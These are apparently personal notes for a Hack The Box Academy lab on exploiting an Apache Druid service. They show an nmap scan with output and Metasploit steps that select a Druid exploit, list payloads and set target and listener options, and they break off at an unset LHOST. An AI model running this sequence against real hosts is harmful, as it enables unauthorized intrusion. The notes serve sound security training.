# https://academy.hackthebox.com/module/39/section/407

# Exploit the Apache Druid service and find the flag.txt file. Submit the contents of this file as the answer.
# Target IP - 10.129.51.173

nmap -sV <TARGET_IP>
nmap -sV 10.129.51.173

# └──╼ [★]$ nmap -sV 10.129.51.173
# Starting Nmap 7.93 ( https://nmap.org ) at 2024-05-21 20:29 BST
# Nmap scan report for 10.129.51.173
# Host is up (0.076s latency).
# Not shown: 995 closed tcp ports (conn-refused)
# PORT     STATE SERVICE VERSION
# 22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
# 8081/tcp open  http    Jetty 9.4.12.v20180830
# 8082/tcp open  http    Jetty 9.4.12.v20180830
# 8083/tcp open  http    Jetty 9.4.12.v20180830
# 8888/tcp open  http    Jetty 9.4.12.v20180830
# Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

# Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done: 1 IP address (1 host up) scanned in 10.67 seconds

msfconsole -q
search apache druid
show payloads
set RHOSTS 10.129.51.173
set RPORT 8081
set TARGET 1
set LHOST 